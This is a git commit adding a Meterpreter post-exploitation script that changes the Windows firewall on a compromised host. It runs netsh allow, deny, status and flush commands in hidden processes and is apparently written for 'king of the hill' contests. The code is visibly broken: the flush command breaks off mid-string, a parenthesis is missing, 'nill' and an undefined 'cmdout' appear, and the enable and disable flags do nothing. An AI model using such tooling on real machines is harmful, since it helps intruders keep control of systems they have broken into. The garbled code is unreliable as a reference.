414a5f790fbd76424ca4a088fd27c87a53121ac2
omgwtfun <omghax11235@aol.com>
2012-07-23 22:16:21 -0400

    Stated meterpreter script

---
+++ meterpreter/firewall.rb
@@ -0,0 +1,73 @@
+#
+# Meterpreter script to enable windows firewall
+# Usefull for king of the hill type activities
+#
+
+@client = client
+@port = '445'
+@enable
+
+opts = Rex::Parser::Arguments.new(
+	"-h" => [ false, "Help Menu" ],
+	"-d" => [ false, "Disable TCP port" ],
+	"-e" => [ false, "Enable TCP port" ],
+	"-f" => [ false, "Flush Firewall rules" ],
+	"-s" => [ false, "Display Firewall status"]
+)
+
+opts.parse(args) { |opt, id, val|
+	case opt
+	when "-d"
+		@enable = false
+	when "-e"
+		@enable = true
+	when "-f"
+		firewall_flush
+	when "-s"
+		firewall_status
+	when "-h"
+		print_line "Firewall -- Windows Firewall Manipulation"
+		print_line 
+		print_line "Quick script for enabling and disabling "
+		print_line "different firewall features using Windows "
+		print_line "netsh advfirewall"
+		print_line(opts.usage)
+		raise Rex::Script::Completed
+	end
+}
+# Print inital firewall status
+def firewall_status() 
+	fw_status_cmd = "netsh firewall show config"
+	print_status("Getting firewall status")
+	print_status("\trunning command #{fw_status_cmd}"
+	exec_cmd(fw_status_cmd)
+end
+
+# Enable tcp ports
+def firewall_enable_tcp_port(port)
+	cmd = "netsh advfirewall add rule name=\"Allow #{port}\" dir=out localport=#{port} protocol=TCP action=allow"
+	print_status("Enabling #{port}")
+	exec_cmd(cmd)
+end
+
+# Disable tcp ports
+def firewall_disable_tcp_port(port)
+	cmd = "netsh advfirewall add rule name=\"DisAllow #{port}\" dir=out localport=#{port} protocol=TCP action=deny"
+	print_status("Disabling #{port}")
+	exec_cmd(cmd)
+end
+
+# Flush all firewall rules
+def firewall_flush()
+	cmd = "netsh a
+# Execute commands 
+def exec_cmd(command)
+	print_status("Executing #{command}")
+	r = @client.sys.process.execute(command, nill, {'Hidden' => true, 'Channelized' => true})
+	while(d = r.channel.read)
+		cmdout << d
+	end
+	r.channel.close
+	r.close
+end
+
